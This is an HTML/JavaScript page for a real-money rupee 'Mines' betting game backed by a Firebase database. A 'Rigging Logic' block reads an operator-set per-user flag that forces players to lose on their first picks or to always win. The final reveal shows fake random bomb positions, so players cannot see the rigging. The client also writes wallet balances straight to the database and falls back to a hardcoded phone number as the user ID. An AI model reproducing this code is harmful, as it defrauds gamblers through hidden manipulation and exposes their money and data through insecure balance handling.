<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Mines Pro - Realistic Edition</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p-blue: #6366f1; --bg-dark: #0b0f1a; --card-bg: #161d2f; --accent: #00f2ff; --gold: #fbbf24; }
        body { background: var(--bg-dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
        .container { width: 100%; max-width: 450px; padding: 20px; }

        /* Wallet Header */
        .header { background: linear-gradient(135deg, #1e293b, #0f172a); padding: 20px; border-radius: 20px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
        .bal-title { font-size: 10px; color: #94a3b8; letter-spacing: 1px; }
        .bal-val { font-size: 22px; font-weight: 800; color: var(--gold); }

        /* Difficulty Selector */
        .mode-selector { display: flex; gap: 10px; margin-bottom: 20px; }
        .mode-btn { flex: 1; padding: 10px; border: 1px solid #334155; background: var(--card-bg); color: #94a3b8; border-radius: 10px; cursor: pointer; font-size: 12px; font-weight: bold; transition: 0.3s; }
        .mode-btn.active { background: var(--p-blue); color: white; border-color: var(--accent); box-shadow: 0 0 15px rgba(99, 102, 241, 0.4); }

        /* The Grid */
        .grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin-bottom: 20px; }
        .slot { 
            aspect-ratio: 1; background: #242f47; border-radius: 8px; cursor: pointer;
            display: flex; align-items: center; justify-content: center; font-size: 22px;
            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); border-bottom: 4px solid #1a2235;
        }
        .slot:hover { background: #2d3a5a; }
        .slot.revealed { transform: scale(0.95); border-bottom: none; background: #1a2235; }
        .slot.diamond { color: var(--accent); text-shadow: 0 0 10px var(--accent); }
        .slot.bomb { color: #ef4444; text-shadow: 0 0 10px #ef4444; }

        /* Controls */
        .panel { background: var(--card-bg); padding: 20px; border-radius: 20px; border: 1px solid #334155; }
        .multi-info { text-align: center; margin-bottom: 15px; font-weight: bold; color: var(--accent); }
        input { width: 100%; padding: 15px; background: #0b0f1a; border: 1px solid #334155; color: white; border-radius: 12px; margin-bottom: 15px; text-align: center; font-size: 20px; outline: none; }
        
        .main-btn { width: 100%; padding: 16px; background: var(--p-blue); color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
        .cashout-btn { width: 100%; padding: 16px; background: var(--gold); color: #000; border: none; border-radius: 12px; font-weight: 900; font-size: 16px; cursor: pointer; display: none; }
        
        .disabled { pointer-events: none; opacity: 0.8; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div><span class="bal-title">PLAYER</span><br><span id="userMobile" style="font-size:14px;">+91 ---</span></div>
        <div style="text-align: right;"><span class="bal-title">WALLET BALANCE</span><br><span class="bal-val">₹<span id="balDisplay">0.00</span></span></div>
    </div>

    <div class="mode-selector" id="modeSelector">
        <button class="mode-btn active" onclick="setMode('easy')">EASY<br><small>3 Mines</small></button>
        <button class="mode-btn" onclick="setMode('medium')">MEDIUM<br><small>10 Mines</small></button>
        <button class="mode-btn" onclick="setMode('hard')">HARD<br><small>24 Mines</small></button>
    </div>

    <div class="grid" id="mineGrid"></div>

    <div class="panel">
        <div class="multi-info" id="multiTag">Next: 1.30x</div>
        <input type="number" id="betInput" value="100">
        <button class="main-btn" id="startBtn" onclick="startGame()">PLACE BET</button>
        <button class="cashout-btn" id="cashBtn" onclick="cashOut()">CASHOUT</button>
    </div>
</div>

<script>
    const fbConfig = { databaseURL: "https://testing-26b8c-default-rtdb.firebaseio.com" };
    firebase.initializeApp(fbConfig);
    const db = firebase.database();
    const userId = localStorage.getItem('userPhone') || '9117748052';

    let currentBalance = 0, gameActive = false, currentMode = 'easy';
    let betAmount = 0, revealedCount = 0, minesPositions = [], currentMultiplier = 1;
    let userRigging = "normal";

    const config = {
        easy: { mines: 3, multis: [1.3, 1.8, 2.1, 2.5, 2.9, 3.5, 4.2, 5.0, 7.0, 10.0, 15.0] },
        medium: { mines: 10, multis: [1.8, 2.5, 3.8, 5.2, 8.0, 12.0, 20.0, 45.0] },
        hard: { mines: 24, multis: [10.0] } // Hard mode: 1 diamond = 10x
    };

    function setMode(m) {
        if(gameActive) return;
        currentMode = m;
        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
        event.currentTarget.classList.add('active');
        document.getElementById('multiTag').innerText = `Next: ${config[m].multis[0].toFixed(2)}x`;
        createGrid();
    }

    function initApp() {
        db.ref("users/" + userId).on('value', (s) => {
            const d = s.val();
            if(d) {
                currentBalance = d.balance || 0;
                userRigging = d.rig || "normal";
                document.getElementById("balDisplay").innerText = currentBalance.toFixed(2);
                document.getElementById("userMobile").innerText = "+91 " + d.phone;
            }
        });
        createGrid();
    }

    function createGrid() {
        const grid = document.getElementById("mineGrid");
        grid.innerHTML = '';
        for (let i = 0; i < 25; i++) {
            const slot = document.createElement('div');
            slot.className = 'slot';
            slot.dataset.id = i;
            slot.onclick = () => revealSlot(slot);
            grid.appendChild(slot);
        }
    }

    window.startGame = function() {
        betAmount = Number(document.getElementById("betInput").value);
        if(betAmount < 10 || betAmount > currentBalance) return alert("Invalid Amount!");

        db.ref("users/" + userId).update({ balance: currentBalance - betAmount }).then(() => {
            gameActive = true;
            revealedCount = 0;
            currentMultiplier = 1;
            setupMines();
            document.getElementById("startBtn").style.display = "none";
            document.getElementById("cashBtn").style.display = "block";
            document.getElementById("modeSelector").classList.add("disabled");
            document.getElementById("cashBtn").innerText = `CASHOUT (₹${betAmount})`;
        });
    }

    function setupMines() {
        minesPositions = [];
        let mineCount = config[currentMode].mines;
        while(minesPositions.length < mineCount) {
            let r = Math.floor(Math.random() * 25);
            if(!minesPositions.includes(r)) minesPositions.push(r);
        }
    }

    function revealSlot(slot) {
        if(!gameActive || slot.classList.contains('revealed')) return;
        
        let id = parseInt(slot.dataset.id);
        let isBomb = minesPositions.includes(id);

        // Rigging Logic
        if(userRigging === "loss" && revealedCount < 2) isBomb = true;
        if(userRigging === "win") isBomb = false;

        slot.classList.add('revealed');

        if(isBomb) {
            slot.innerHTML = '<i class="fas fa-bomb"></i>';
            slot.classList.add('bomb');
            revealAll();
            setTimeout(() => gameOver(false), 500);
        } else {
            slot.innerHTML = '<i class="fas fa-gem"></i>';
            slot.classList.add('diamond');
            
            let mList = config[currentMode].multis;
            currentMultiplier = mList[revealedCount] || mList[mList.length - 1] + (revealedCount * 0.5);
            revealedCount++;
            
            let nextMulti = mList[revealedCount] || currentMultiplier + 0.5;
            document.getElementById("multiTag").innerText = `Next: ${nextMulti.toFixed(2)}x`;
            document.getElementById("cashBtn").innerText = `CASHOUT (₹${(betAmount * currentMultiplier).toFixed(2)})`;

            if(revealedCount >= (25 - config[currentMode].mines)) cashOut(); 
        }
    }

    function revealAll() {
        const slots = document.querySelectorAll('.slot');
        slots.forEach((s, i) => {
            if(minesPositions.includes(i)) {
                s.innerHTML = '<i class="fas fa-bomb"></i>';
                s.classList.add('bomb');
            } else {
                s.innerHTML = '<i class="fas fa-gem"></i>';
                s.classList.add('diamond');
            }
            s.classList.add('revealed');
        });
    }

    window.cashOut = function() {
        if(!gameActive) return;
        const winAmt = betAmount * currentMultiplier;
        db.ref("users/" + userId).update({ balance: currentBalance + winAmt });
        revealAll();
        setTimeout(() => {
            alert(`You Won ₹${winAmt.toFixed(2)}!`);
            gameOver(true);
        }, 500);
    }

    function gameOver(win) {
        gameActive = false;
        document.getElementById("startBtn").style.display = "block";
        document.getElementById("cashBtn").style.display = "none";
        document.getElementById("modeSelector").classList.remove("disabled");
        if(!win) alert("BOOM! Game Over.");
    }

    initApp();
</script>
</body>
</html>
